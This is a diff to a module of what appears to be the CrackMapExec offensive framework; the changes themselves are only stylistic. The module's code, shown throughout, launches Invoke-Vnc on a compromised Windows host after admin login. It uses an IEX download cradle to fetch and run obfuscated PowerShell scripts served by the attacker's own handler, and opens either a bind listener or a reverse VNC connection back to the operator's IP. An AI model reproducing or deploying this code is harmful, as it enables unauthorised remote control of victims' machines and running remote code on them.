@@ -39,10 +39,12 @@ class CMEModule:
         self.ps_script2 = obfs_ps_script('invoke-vnc/Invoke-Vnc.ps1')
 
     def on_admin_login(self, context, connection):
-        if self.contype == 'reverse':
-            command = 'Invoke-Vnc -ConType reverse -IpAddress {} -Port {} -Password {}'.format(context.localip, self.port, self.password)
-        elif self.contype == 'bind':
-            command = 'Invoke-Vnc -ConType bind -Port {} -Password {}'.format(self.port, self.password)
+        if self.contype == 'bind':
+            command = f'Invoke-Vnc -ConType bind -Port {self.port} -Password {self.password}'
+
+
+        elif self.contype == 'reverse':
+            command = f'Invoke-Vnc -ConType reverse -IpAddress {context.localip} -Port {self.port} -Password {self.password}'
 
         vnc_command = gen_ps_iex_cradle(context, 'Invoke-Vnc.ps1', command, post_back=False)
 
@@ -52,13 +54,13 @@ class CMEModule:
         context.log.success('Executed launcher')
 
     def on_request(self, context, request):
-        if 'Invoke-PSInject.ps1' == request.path[1:]:
+        if request.path[1:] == 'Invoke-PSInject.ps1':
             request.send_response(200)
             request.end_headers()
 
             request.wfile.write(self.ps_script1)
 
-        elif 'Invoke-Vnc.ps1' == request.path[1:]:
+        elif request.path[1:] == 'Invoke-Vnc.ps1':
             request.send_response(200)
             request.end_headers()
 
